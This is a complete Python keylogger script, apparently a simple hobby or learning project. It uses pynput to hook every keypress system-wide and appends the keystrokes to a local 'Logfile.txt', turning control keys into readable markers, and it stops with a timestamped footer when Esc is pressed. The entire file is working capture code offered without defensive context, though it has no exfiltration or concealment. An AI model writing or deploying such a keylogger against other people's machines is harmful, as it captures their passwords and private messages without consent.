from pynput.keyboard import Key, Listener
import datetime
import os

count = 0
keys = []

try:

    f = open('Logfile.txt', 'a')
    f.close()
except:

    f = open('Logfile.txt', 'w')
    f.close()

def on_press(key):
	global keys, count
	keys.append(key)
	count += 1

	if count <= 1:
		count = 0
		write_file(keys)
		keys = []

def write_file(keys):
	with open("Logfile.txt", "a") as f:
		for key in keys:
			k = str(key).replace("'","")

			if k.find("ctrl_l") > 0:
				f.write('L_CRTL\n')
			elif k.find("ctrl_r") > 0:
				f.write('R_CRTL\n')
			elif k.find("enter") > 0:
				f.write('\n')
			elif k.find("space") > 0:
				f.write(' ')
			elif k.find("tab") > 0:
				f.write('	')
			elif k.find("shift") > 0:
				f.write('')
			elif k.find("pause") > 0:
				f.write('')
			elif k.find("caps") > 0:
				f.write('')
			elif k.find("esc") > 0:
				f.write('\nKey.esc\n')
			elif k.find("key") == -1:
				f.write(k)

def on_release(key):
	with open("Logfile.txt", "a") as f:
		if key == Key.esc:
			current_time = datetime.datetime.now() 
			f.write("\nProgram ended. File Closed\n\nTaken on: " + str(current_time) + "\n--------------------------------------------------------------------------------------\n")
			return False
        
with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()
